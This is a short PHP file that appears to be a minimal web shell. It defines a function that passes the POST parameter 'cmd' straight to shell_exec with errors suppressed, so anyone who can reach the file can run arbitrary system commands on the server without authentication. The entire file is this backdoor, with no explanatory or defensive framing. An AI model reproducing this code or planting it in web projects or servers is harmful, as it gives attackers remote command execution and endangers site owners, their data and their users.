<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	
    if(function_exists('shell_exec'))$exec=@shell_exec($command);
	return $exec;
}

Exe($_POST['cmd']);
?>